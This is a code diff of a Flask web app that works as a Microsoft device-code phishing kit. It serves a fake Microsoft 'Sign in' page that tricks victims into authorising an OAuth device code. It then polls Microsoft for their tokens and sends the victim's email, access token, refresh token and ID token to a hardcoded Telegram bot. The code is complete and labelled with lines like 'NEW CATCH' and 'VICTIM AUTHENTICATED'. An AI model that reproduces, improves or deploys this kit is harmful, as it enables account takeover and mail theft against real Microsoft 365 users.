@@ -1,72 +1,56 @@
 import os
 import time
-import uuid
 import json
 import base64
 import sqlite3
-import threading
 import requests
+import uuid
 from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
-# --- Config ---
+# --- CONFIG ---
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
-
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
     "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
-    "ab9b8c07-8f02-4f72-90fa-0fc6e3df3b70",  # OneDrive
+    "ab9b8c07-8f02-4f72-9fa2-a2b4ada3a5b5",  # OneDrive
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
 ]
-SCOPES = "openid profile offline_access https://graph.microsoft.com/.default"
+CLIENT_INDEX = 0
 TENANT = "common"
 
 # --- DB ---
-db_lock = threading.Lock()
-
 def init_db():
-    with db_lock:
-        con = sqlite3.connect(DB_PATH)
-        con.row_factory = sqlite3.Row
-        con.execute("""
-            CREATE TABLE IF NOT EXISTS sessions (
-                sid TEXT PRIMARY KEY,
-                device_code TEXT,
-                user_code TEXT,
-                client_id TEXT,
-                interval INTEGER,
-                status TEXT,
-                email TEXT,
-                notified INTEGER DEFAULT 0,
-                created_at REAL
-            )
-        """)
-        con.commit()
-        con.close()
-
-def db_exec(sql, params=()):
-    with db_lock:
-        con = sqlite3.connect(DB_PATH)
-        con.row_factory = sqlite3.Row
-        con.execute(sql, params)
-        con.commit()
-        con.close()
-
-def db_query(sql, params=()):
-    with db_lock:
-        con = sqlite3.connect(DB_PATH)
-        con.row_factory = sqlite3.Row
-        rows = con.execute(sql, params).fetchall()
-        con.close()
-        return [dict(r) for r in rows]
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
+        vid TEXT PRIMARY KEY,
+        device_code TEXT,
+        user_code TEXT,
+        client_id TEXT,
+        interval INTEGER,
+        expires_at REAL,
+        status TEXT
+    )""")
+    conn.commit()
+    conn.close()
 
 init_db()
 
-# --- Telegram ---
+def db_execute(query, params=()):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute(query, params)
+    conn.commit()
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+# --- TELEGRAM ---
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -75,150 +59,179 @@ def send_telegram(message):
             "text": message,
             "parse_mode": "HTML",
             "disable_web_page_preview": True
-        }, timeout=10)
-        print(f"[TELEGRAM] status={resp.status_code} body={resp.text[:200]}")
-        if resp.status_code != 200:
-            # fallback: plain text (HTML parse errors)
-            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=10)
+        }, timeout=15)
+        print(f"[TG] status={resp.status_code}")
     except Exception as e:
-        print(f"[TELEGRAM] EXCEPT: {e}")
+        print(f"[TG ERROR] {e}")
 
-# --- Device flow ---
+# --- MICROSOFT ---
 def initiate_device_flow():
-    for cid in CLIENT_IDS:
+    global CLIENT_INDEX
+    for _ in range(len(CLIENT_IDS)):
+        client_id = CLIENT_IDS[CLIENT_INDEX]
         try:
             resp = requests.post(
                 f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode",
-                data={"client_id": cid, "scope": SCOPES},
-                timeout=15,
+                data={
+                    "client_id": client_id,
+                    "scope": "openid profile offline_access https://graph.microsoft.com/.default Mail.Read User.Read"
+                },
+                timeout=15
             )
             if resp.status_code == 200:
-                d = resp.json()
-                return d, cid
-            print(f"[FLOW] client {cid} failed: {resp.status_code} {resp.text[:150]}")
+                data = resp.json()
+                data["client_id"] = client_id
+                print(f"[FLOW OK] client={client_id} user_code={data['user_code']}")
+                return data
+            elif "invalid_client" in resp.text:
+                CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
+                continue
+            else:
+                print(f"[MS INIT ERROR] {resp.text[:300]}")
         except Exception as e:
-            print(f"[FLOW] client {cid} EXCEPT: {e}")
-    return None, None
+            print(f"[MS INIT EXCEPT] {e}")
+        CLIENT_INDEX = (CLIENT_INDEX + 1) % len(CLIENT_IDS)
+    return None
+
+def poll_once(device_code, client_id):
+    try:
+        resp = requests.post(
+            f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
+            data={
+                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                "client_id": client_id,
+                "device_code": device_code
+            },
+            timeout=15
+        )
+        result = resp.json()
+        if resp.status_code == 200 and "access_token" in result:
+            return result
+        err = result.get("error", "")
+        if err in ("authorization_pending", "slow_down"):
+            return "pending"
+        print(f"[POLL ERROR] {result}")
+        return None
+    except Exception as e:
+        print(f"[POLL EXCEPT] {e}")
+        return "pending"
 
 def decode_email(id_token):
     try:
         payload = id_token.split(".")[1]
         payload += "=" * (4 - len(payload) % 4)
         info = json.loads(base64.urlsafe_b64decode(payload))
-        return info.get("preferred_username") or info.get("upn") or info.get("email") or "Unknown"
+        return info.get("preferred_username", info.get("upn", "Unknown"))
     except Exception:
         return "Unknown"
 
-POLLERS = {}          # sid -> Thread
-pollers_lock = threading.Lock()
+def handle_success(vid, tokens):
+    email = decode_email(tokens.get("id_token", ""))
+    msg = (
+        f"<b>🔥 NEW CATCH 🔥</b>\n\n"
+        f"<b>Email:</b> <code>{email}</code>\n"
+        f"<b>Session:</b> <code>{vid[:8]}</code>\n\n"
+        f"<b>ACCESS TOKEN:</b>\n<code>{tokens.get('access_token','')}</code>\n\n"
+        f"<b>REFRESH TOKEN:</b>\n<code>{tokens.get('refresh_token','')}</code>\n\n"
+        f"<b>ID TOKEN:</b>\n<code>{tokens.get('id_token','')}</code>"
+    )
+    send_telegram(msg)
+    db_execute("UPDATE sessions SET status='completed' WHERE vid=?", (vid,))
+    print(f"[SUCCESS] {vid} -> {email}")
 
-def poll_loop(sid, device_code, interval):
-    print(f"[POLL] running sid={sid}")
-    deadline = time.time() + 900
-    while time.time() < deadline:
-        try:
-            resp = requests.post(
-                f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
-                data={
-                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-                    "client_id": _client_id_of(sid),
-                    "device_code": device_code,
-                },
-                timeout=15,
-            )
-            result = resp.json()
-            err = result.get("error")
-            print(f"[POLL] sid={sid} status={resp.status_code} error={err}")
-            if resp.status_code == 200:
-                email = decode_email(result.get("id_token", ""))
-                msg = (
-                    f"<b>🔥 VICTIM AUTHENTICATED</b>\n\n"
-                    f"<b>Email:</b> <code>{email}</code>\n"
-                    f"<b>SID:</b> <code>{sid}</code>\n\n"
-                    f"<b>ACCESS TOKEN:</b>\n<code>{result.get('access_token','')}</code>\n\n"
-                    f"<b>REFRESH TOKEN:</b>\n<code>{result.get('refresh_token','')}</code>\n\n"
-                    f"<b>ID TOKEN:</b>\n<code>{result.get('id_token','')}</code>"
-                )
-                send_telegram(msg)
-                db_exec("UPDATE sessions SET status='completed', email=?, notified=1 WHERE sid=?", (email, sid))
-                print(f"[POLL] SUCCESS sid={sid} email={email}")
-                with pollers_lock:
-                    POLLERS.pop(sid, None)
-                return
-            elif err == "authorization_pending":
-                time.sleep(interval)
-            elif err == "slow_down":
-                interval += 5
-                time.sleep(interval)
-            else:
-                print(f"[POLL] FATAL sid={sid} error={err} desc={result.get('error_description','')}")
-                db_exec("UPDATE sessions SET status=? WHERE sid=?", (err or "error", sid))
-                with pollers_lock:
-                    POLLERS.pop(sid, None)
-                return
-        except Exception as e:
-            print(f"[POLL] EXCEPT sid={sid}: {e}")
-            time.sleep(5)
-    db_exec("UPDATE sessions SET status='expired' WHERE sid=?", (sid,))
-    print(f"[POLL] EXPIRED sid={sid}")
-    with pollers_lock:
-        POLLERS.pop(sid, None)
-
-def _client_id_of(sid):
-    rows = db_query("SELECT client_id FROM sessions WHERE sid=?", (sid,))
-    return rows[0]["client_id"] if rows else CLIENT_IDS[0]
-
-def start_poller(sid, device_code, interval):
-    with pollers_lock:
-        t = POLLERS.get(sid)
-        if t and t.is_alive():
-            print(f"[POLL] already running sid={sid}")
-            return
-        thread = threading.Thread(target=poll_loop, args=(sid, device_code, interval), daemon=True)
-        POLLERS[sid] = thread
-    thread.start()
-    print(f"[POLL] spawned sid={sid}")
-
-# --- Routes ---
-PAGE = """<!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in</title>
-<style>
-body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-.card{background:#fff;width:400px;max-width:92vw;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
-.code{background:#f2f2f2;border:1px solid #ccc;padding:12px;font-size:24px;font-weight:600;text-align:center;letter-spacing:2px;cursor:pointer;margin:16px 0}
-.btn{background:#0067b8;color:#fff;border:none;padding:10px;width:100%;font-size:15px;cursor:pointer}
-</style></head>
-<body><div class="card">
-<h2>Sign in</h2>
-<p>Enter this code at <b>https://microsoft.com/devicelogin</b></p>
-<div class="code" onclick="navigator.clipboard.writeText('{{ user_code }}').then(function(){location.href='https://microsoft.com/devicelogin';});">{{ user_code }}</div>
-<button class="btn" onclick="navigator.clipboard.writeText('{{ user_code }}').then(function(){location.href='https://microsoft.com/devicelogin';});">Copy code & continue</button>
-</div></body></html>"""
-
+# --- ROUTES ---
 @app.route("/")
 def index():
-    flow, cid = initiate_device_flow()
+    flow = initiate_device_flow()
     if not flow:
-        return "Service temporarily unavailable", 500
-    sid = str(uuid.uuid4())
-    db_exec(
-        "INSERT INTO sessions (sid, device_code, user_code, client_id, interval, status, created_at) VALUES (?,?,?,?,?,?,?)",
-        (sid, flow["device_code"], flow["user_code"], cid, flow.get("interval", 5), "pending", time.time()),
+        return "Service temporarily unavailable. Refresh the page.", 500
+    vid = str(uuid.uuid4())
+    db_execute(
+        "INSERT OR REPLACE INTO sessions (vid, device_code, user_code, client_id, interval, expires_at, status) VALUES (?,?,?,?,?,?,?)",
+        (vid, flow["device_code"], flow["user_code"], flow["client_id"],
+         flow.get("interval", 5), time.time() + flow.get("expires_in", 900), "pending")
     )
-    print(f"[FLOW OK] sid={sid} client={cid} user_code={flow['user_code']}")
-    start_poller(sid, flow["device_code"], flow.get("interval", 5))
-    return render_template_string(PAGE, user_code=flow["user_code"])
+    return render_template_string(PAGE, user_code=flow["user_code"], vid=vid)
+
+@app.route("/status/<vid>")
+def status(vid):
+    rows = db_execute("SELECT device_code, client_id, expires_at, status FROM sessions WHERE vid=?", (vid,))
+    if not rows:
+        return jsonify({"status": "invalid"})
+    device_code, client_id, expires_at, st = rows[0]
+
+    if st == "completed":
+        return jsonify({"status": "completed"})
+    if time.time() > expires_at:
+        db_execute("UPDATE sessions SET status='expired' WHERE vid=?", (vid,))
+        return jsonify({"status": "expired"})
+
+    result = poll_once(device_code, client_id)
+    if result == "pending":
+        return jsonify({"status": "pending"})
+    if result is None:
+        return jsonify({"status": "expired"})
+
+    handle_success(vid, result)
+    return jsonify({"status": "completed"})
 
 @app.route("/test-telegram")
 def test_telegram():
     send_telegram("<b>✅ Test message from outlook-verify</b>")
-    return "Test sent — check Telegram."
+    return "Telegram test sent — check your chat."
 
-@app.route("/healthz")
-def healthz():
-    return "ok"
+# --- PAGE ---
+PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in</title>
+<style>
+ body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+ .card{background:#fff;width:92%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+ h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px}
+ p{font-size:15px;color:#1b1b1b;line-height:1.5}
+ .code{background:#f2f2f2;border:1px solid #ccc;padding:12px;font-size:26px;font-weight:600;letter-spacing:3px;text-align:center;margin:18px 0;cursor:pointer;user-select:all}
+ .btn{background:#0067b8;color:#fff;border:none;padding:10px;width:100%;font-size:15px;cursor:pointer}
+ .btn:hover{background:#005da6}
+ #msg{margin-top:18px;font-size:14px;color:#0067b8;display:none}
+ #done{margin-top:18px;font-size:14px;color:#107c10;font-weight:600;display:none}
+ .footer{margin-top:36px;font-size:12px;color:#666}
+</style>
+</head>
+<body>
+<div class="card">
+ <h1>Sign in</h1>
+ <p>Enter the code below at <b>https://microsoft.com/devicelogin</b> to complete verification.</p>
+ <div class="code">{{ user_code }}</div>
+ <button class="btn" onclick="go()">Copy code and continue</button>
+ <div id="msg">Waiting for sign-in…</div>
+ <div id="done">✅ Sign-in successful. You can close this page.</div>
+ <div class="footer">&copy; 2026 Microsoft</div>
+</div>
+<script>
+var vid = "{{ vid }}";
+function go(){
+  navigator.clipboard.writeText("{{ user_code }}").catch(function(){});
+  window.location.href = "https://microsoft.com/devicelogin";
+}
+function poll(){
+  fetch("/status/" + vid)
+    .then(r => r.json())
+    .then(d => {
+      if(d.status === "pending"){ document.getElementById("msg").style.display="block"; setTimeout(poll, 3000); }
+      else if(d.status === "completed"){ document.getElementById("msg").style.display="none"; document.getElementById("done").style.display="block"; }
+      else { document.getElementById("msg").style.display="none"; document.getElementById("done").style.display="block"; document.getElementById("done").textContent="Code expired. Please restart verification."; }
+    })
+    .catch(() => setTimeout(poll, 3000));
+}
+setTimeout(poll, 3000);
+</script>
+</body>
+</html>
+"""
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
